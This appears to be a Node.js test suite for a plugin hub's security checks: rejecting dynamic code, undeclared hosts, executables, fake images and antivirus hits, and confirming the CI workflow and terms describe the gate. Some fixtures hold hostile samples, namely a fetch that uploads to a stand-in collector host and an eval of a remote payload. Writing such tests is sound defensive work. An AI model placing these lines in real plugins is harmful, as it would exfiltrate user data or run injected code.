import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const security = require("../tools/plugin-hub-action.js");

const plugin = {
  homepage: "https://example.com/",
  site_url: "https://example.com/"
};

const manifest = {
  id: "example",
  match: { hosts: ["example.com"] },
  browser: {
    home_url: "https://example.com/",
    icon_url: "https://example.com/favicon.png",
    download_target_script_file: "browser/download_target.js"
  }
};

function file(path, content) {
  return { path, content: Buffer.from(content) };
}

test("security analysis accepts a small readable plugin that contacts declared hosts", () => {
  const files = [
    file("plugin.json", JSON.stringify(manifest)),
    file("browser/download_target.js", "async function chapters() { return fetch(\"https://api.example.com/chapters\"); }\n")
  ];
  assert.deepEqual(security.analyzePublishedPluginFiles(files, plugin, manifest), {
    fileCount: 2,
    totalBytes: files[0].content.length + files[1].content.length
  });
});

test("security analysis reports malicious code with its file and line", () => {
  const files = [
    file("plugin.json", JSON.stringify(manifest)),
    file("browser/download_target.js", "const title = document.title;\neval(window.payload);\n")
  ];
  assert.throws(
    () => security.analyzePublishedPluginFiles(files, plugin, manifest),
    (error) => error.message.includes("browser/download_target.js:2 [dynamic-code]")
  );
});

test("security analysis rejects undeclared network hosts", () => {
  const files = [
    file("plugin.json", JSON.stringify(manifest)),
    file("browser/download_target.js", "fetch(\"https://collector.invalid/upload\");\n")
  ];
  assert.throws(
    () => security.analyzePublishedPluginFiles(files, plugin, manifest),
    (error) => error.message.includes("[undeclared-network-host]") && error.message.includes("collector.invalid")
  );
});

test("security analysis rejects executable files and disguised images", () => {
  assert.equal(security.isAllowedPublishedFile("payload.exe"), false);
  assert.equal(security.isAllowedPublishedFile("browser/download_target.js"), true);
  assert.throws(
    () => security.analyzePublishedPluginFiles([file("browser/download_target.js", "#!/usr/bin/env node\n")], plugin, manifest),
    (error) => error.message.includes("[executable-script]")
  );
  assert.throws(
    () => security.analyzePublishedPluginFiles([file("cover.png", "not a png")], plugin, manifest),
    (error) => error.message.includes("[invalid-image]")
  );
});

test("antivirus result is fail-closed for detections and scanner errors", () => {
  assert.doesNotThrow(() => security.runAntivirusScan("scan", () => ({ status: 0, stdout: "" })));
  assert.throws(
    () => security.runAntivirusScan("scan", () => ({ status: 1, stdout: "scan/payload: Eicar-Signature FOUND" })),
    /Antivirus scan found malware/
  );
  assert.throws(
    () => security.runAntivirusScan("scan", () => ({ status: 2, stderr: "database unavailable" })),
    /publication was blocked/
  );
});

test("repository review scans an immutable snapshot and removes its temporary copy", async () => {
  const snapshot = {
    commitSha: "0123456789abcdef0123456789abcdef01234567",
    files: [
      file("plugin.json", JSON.stringify(manifest)),
      file("browser/download_target.js", "const title = document.title;\n")
    ]
  };
  let scanRoot = "";
  const result = await security.reviewRepositorySecurity(plugin, {
    snapshot,
    antivirusScan(root) {
      scanRoot = root;
      assert.equal(fs.existsSync(`${root}/plugin.json`), true);
      assert.equal(fs.existsSync(`${root}/browser/download_target.js`), true);
    }
  });
  assert.equal(result.commitSha, snapshot.commitSha);
  assert.deepEqual(result.filePaths, ["plugin.json", "browser/download_target.js"]);
  assert.equal(fs.existsSync(scanRoot), false);
});

test("publication workflow and public documentation require the complete security gate", () => {
  const workflow = fs.readFileSync(new URL("../.github/workflows/plugin-hub.yml", import.meta.url), "utf8");
  const actionSource = fs.readFileSync(new URL("../tools/plugin-hub-action.js", import.meta.url), "utf8");
  const terms = fs.readFileSync(new URL("../terms/index.html", import.meta.url), "utf8");
  const catalog = JSON.parse(fs.readFileSync(new URL("../plugins/catalog.json", import.meta.url), "utf8"));
  assert.match(workflow, /actions\/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\.0\.1/);
  assert.match(workflow, /actions\/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7\.0\.0/);
  assert.match(workflow, /node-version: "24"/);
  assert.match(workflow, /sudo freshclam --stdout/);
  assert.match(actionSource, /reviewRepositorySecurity\(plugin\)/);
  assert.match(actionSource, /plugin\.repository_ref = securityReview\.commitSha/);
  assert.match(terms, /ClamAV then scans the\s+complete plugin snapshot/);
  assert.match(terms, /O catálogo guarda o commit analisado/);
  catalog.plugins
    .filter((entry) => entry.status === "active")
    .forEach((entry) => assert.match(entry.repository_ref, /^[a-f0-9]{40}$/));
});
